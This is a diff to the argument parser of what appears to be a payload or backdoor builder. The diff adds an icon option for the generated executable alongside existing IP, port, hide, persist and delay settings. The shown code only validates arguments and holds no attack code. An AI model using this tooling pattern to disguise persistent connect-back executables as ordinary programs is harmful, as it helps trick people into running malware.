@@ -2,6 +2,7 @@
 # Author: Pure-L0G1C
 # Description: Arguments
 
+from os import path 
 from re import match 
 from argparse import ArgumentParser
 
@@ -14,6 +15,7 @@ class Args(object):
   self.type = None
   self.hide = None
   self.wait = None
+  self.icon = None
   self.delay = None 
   self.persist = None
 
@@ -60,6 +62,13 @@ class Args(object):
                       Example: -t python \
                       Example: -t exe')
 
+  parser.add_argument('-ic',
+                     '--icon',
+                     default=None,
+                     help='the output type.\
+                      Example: -ic FILE.ico \
+                      Example: -ic FILE.exe')
+
   parser.add_argument('-hd',
                      '--hide',
                      default=False,
@@ -85,10 +94,11 @@ class Args(object):
   self.type = args.type
   self.hide = args.hide
   self.wait = args.wait
+  self.icon = args.icon 
   self.delay = args.delay
   self.persist = args.persist
  
-  if any([not self.valid_ip, not self.valid_port, not self.valid_type, not self.valid_wait, not self.valid_delay]):
+  if any([not self.valid_ip, not self.valid_port, not self.valid_type, not self.valid_wait, not self.valid_delay, not self.valid_icon]):
    return False
   return True 
 
@@ -124,6 +134,19 @@ class Args(object):
   self.type = True if self.type == 'exe' else False
   return True 
 
+ @property
+ def valid_icon(self):
+  if not self.icon:
+   return True 
+  if not path.exists(self.icon):
+   self.error('Check your path to your icon, `{}` does not exist'.format(self.icon))
+   return False
+  else:
+   if not any([self.icon.endswith('exe'), self.icon.endswith('ico')]):
+    self.error('Icon file must be a .ico or .exe')
+    return False
+  return True 
+
  @property 
  def valid_delay(self):
   delay = str(self.delay)
@@ -148,5 +171,4 @@ class Args(object):
    return False 
   else:
    self.wait = int(wait)
-  return True 
- 
+  return True
